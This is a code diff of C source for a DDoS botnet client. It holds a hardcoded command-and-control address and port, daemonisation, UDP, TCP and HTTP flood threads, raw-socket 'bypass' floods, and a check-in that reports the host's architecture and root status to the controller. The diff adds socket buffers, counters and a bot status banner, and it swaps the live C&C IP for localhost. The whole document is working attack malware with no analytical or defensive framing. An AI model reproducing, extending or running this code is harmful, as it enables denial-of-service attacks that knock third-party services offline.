@@ -25,7 +25,7 @@
 #include <sys/utsname.h>
 
 #define BUFFER_SIZE 4096
-#define CNC_IP "45.134.39.212"
+#define CNC_IP "127.0.0.1"
 #define CNC_PORT 4087
 #define MAX_PACKET 65535
 #define MAX_THREADS 500
@@ -118,13 +118,13 @@ void daemonize() {
     if (pid < 0) exit(EXIT_FAILURE);
     if (pid > 0) exit(EXIT_SUCCESS);
     umask(0);
-    (void)chdir("/");
+    chdir("/");
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
     open("/dev/null", O_RDWR);
-    (void)dup(0);
-    (void)dup(0);
+    dup(0);
+    dup(0);
 }
 
 void get_arch() {
@@ -209,6 +209,7 @@ void *udp_flood(void *arg) {
     char packet[MAX_PACKET];
     int packet_size;
     time_t end_time;
+    int sent_count = 0;
 
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
@@ -242,6 +243,7 @@ void *udp_flood(void *arg) {
         if (result > 0) {
             packets_sent++;
             bytes_sent += result;
+            sent_count++;
         }
 
         if (args->threads > 1) {
@@ -252,6 +254,7 @@ void *udp_flood(void *arg) {
                 if (result > 0) {
                     packets_sent++;
                     bytes_sent += result;
+                    sent_count++;
                 }
             }
         }
@@ -269,14 +272,25 @@ void *udp_flood(void *arg) {
 
 void *tcp_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
+    int sockfd;
     struct sockaddr_in target_addr;
     char packet[MAX_PACKET];
     int packet_size;
     time_t end_time;
+    int sent_count = 0;
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        return NULL;
+    }
+
+    int bufsize = 1024 * 1024 * 16;
+    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(args->port);
     if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
+        close(sockfd);
         return NULL;
     }
 
@@ -298,6 +312,7 @@ void *tcp_flood(void *arg) {
             close(conn);
             packets_sent++;
             bytes_sent += packet_size;
+            sent_count++;
         }
 
         if (args->threads > 1) {
@@ -311,6 +326,7 @@ void *tcp_flood(void *arg) {
                     close(conn2);
                     packets_sent++;
                     bytes_sent += packet_size;
+                    sent_count++;
                 }
             }
         }
@@ -322,19 +338,31 @@ void *tcp_flood(void *arg) {
         }
     }
 
+    close(sockfd);
     return NULL;
 }
 
 void *http_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
+    int sockfd;
     struct sockaddr_in target_addr;
     char http_request[4096];
     int ua_counter = rand() % NUM_USER_AGENTS;
     time_t end_time;
+    int sent_count = 0;
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        return NULL;
+    }
+
+    int bufsize = 1024 * 1024 * 16;
+    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(args->port);
     if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
+        close(sockfd);
         return NULL;
     }
 
@@ -353,6 +381,7 @@ void *http_flood(void *arg) {
             close(conn);
             packets_sent++;
             bytes_sent += strlen(http_request);
+            sent_count++;
         }
 
         if (args->threads > 1) {
@@ -366,6 +395,7 @@ void *http_flood(void *arg) {
                     close(conn2);
                     packets_sent++;
                     bytes_sent += strlen(http_request);
+                    sent_count++;
                 }
             }
         }
@@ -377,6 +407,7 @@ void *http_flood(void *arg) {
         }
     }
 
+    close(sockfd);
     return NULL;
 }
 
@@ -390,6 +421,8 @@ void *udp_raw_flood(void *arg) {
     unsigned char *payload;
     int packet_size;
     time_t end_time;
+    int sent_count = 0;
+    int error_count = 0;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
@@ -450,6 +483,15 @@ void *udp_raw_flood(void *arg) {
         if (result > 0) {
             packets_sent++;
             bytes_sent += result;
+            sent_count++;
+        } else {
+            error_count++;
+            if (error_count < 10 && errno != EPERM && errno != EACCES) {
+            }
+            if (errno == EPERM || errno == EACCES) {
+                close(sockfd);
+                return NULL;
+            }
         }
 
         if (args->threads > 1) {
@@ -483,6 +525,7 @@ void *udp_raw_flood(void *arg) {
                 if (result > 0) {
                     packets_sent++;
                     bytes_sent += result;
+                    sent_count++;
                 }
             }
         }
@@ -507,6 +550,7 @@ void *tcp_raw_flood(void *arg) {
     struct tcphdr *tcp_header;
     int packet_size;
     time_t end_time;
+    int sent_count = 0;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
@@ -570,6 +614,7 @@ void *tcp_raw_flood(void *arg) {
         if (result > 0) {
             packets_sent++;
             bytes_sent += result;
+            sent_count++;
         }
 
         if (args->threads > 1) {
@@ -606,6 +651,7 @@ void *tcp_raw_flood(void *arg) {
                 if (result > 0) {
                     packets_sent++;
                     bytes_sent += result;
+                    sent_count++;
                 }
             }
         }
@@ -633,6 +679,7 @@ void *http_raw_flood(void *arg) {
     time_t end_time;
     char http_request[4096];
     int ua_counter = rand() % NUM_USER_AGENTS;
+    int sent_count = 0;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
@@ -708,6 +755,7 @@ void *http_raw_flood(void *arg) {
         if (result > 0) {
             packets_sent++;
             bytes_sent += result;
+            sent_count++;
         }
 
         if (args->threads > 1) {
@@ -753,6 +801,7 @@ void *http_raw_flood(void *arg) {
                 if (result > 0) {
                     packets_sent++;
                     bytes_sent += result;
+                    sent_count++;
                 }
             }
         }
@@ -784,6 +833,7 @@ void start_attack(char *cmd) {
     int port, duration, threads, pps, size, delay;
     char method[32];
     char host[128];
+    char path[256];
     
     if (attack_running) {
         stop_attack();
@@ -916,27 +966,8 @@ void execute_command(char* cmd) {
 
 int connect_to_cnc() {
     struct sockaddr_in server_addr;
-    
-    if (sock >= 0) {
-        close(sock);
-        sock = -1;
-    }
-    
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) return -1;
-    
-    int keepalive = 1;
-    int keepidle = 30;
-    int keepintvl = 10;
-    int keepcnt = 5;
-    
-    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
-    setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
-    setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
-    setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
-    
-    int reuse = 1;
-    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
     
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(CNC_PORT);
@@ -952,13 +983,30 @@ int connect_to_cnc() {
         return -1;
     }
     
-    char handshake[128];
-    snprintf(handshake, sizeof(handshake), "HBT|%s|%s\n", arch, version);
-    send(sock, handshake, strlen(handshake), 0);
+    char hbt[256];
+    snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
+    send(sock, hbt, strlen(hbt), 0);
     
     char info[512];
     snprintf(info, sizeof(info), "INFO:{\"arch\":\"%s\",\"version\":\"%s\",\"root\":%d}\n", arch, version, is_root);
     send(sock, info, strlen(info), 0);
+    
+    char status[1024];
+    snprintf(status, sizeof(status),
+        "\n========================================\n"
+        "  BOT STATUS REPORT\n"
+        "========================================\n"
+        "  ARCHITECTURE : %s\n"
+        "  VERSION      : %s\n"
+        "  ROOT STATUS  : %s\n"
+        "  METHODS      : %s\n"
+        "========================================\n\n",
+        arch,
+        version,
+        is_root ? "YES (ROOT) - RAW METHODS AVAILABLE" : "NO (NON-ROOT) - NORMAL METHODS ONLY",
+        is_root ? "udp, tcp, http, udp-bypass, tcp-bypass, http-bypass" : "udp, tcp, http"
+    );
+    send(sock, status, strlen(status), 0);
     
     return 0;
 }
@@ -967,22 +1015,19 @@ void reconnect_loop() {
     fd_set readfds;
     struct timeval tv;
     char buffer[BUFFER_SIZE];
-    int reconnect_delay = 1;
     
     while (running) {
         if (sock < 0) {
-            int ret = connect_to_cnc();
-            if (ret < 0) {
-                sleep(reconnect_delay);
-                if (reconnect_delay < 300) reconnect_delay *= 2;
+            connect_to_cnc();
+            if (sock < 0) {
+                sleep(5);
                 continue;
             }
-            reconnect_delay = 1;
         }
         
         FD_ZERO(&readfds);
         FD_SET(sock, &readfds);
-        tv.tv_sec = 30;
+        tv.tv_sec = 20;
         tv.tv_usec = 0;
         
         int activity = select(sock + 1, &readfds, NULL, NULL, &tv);
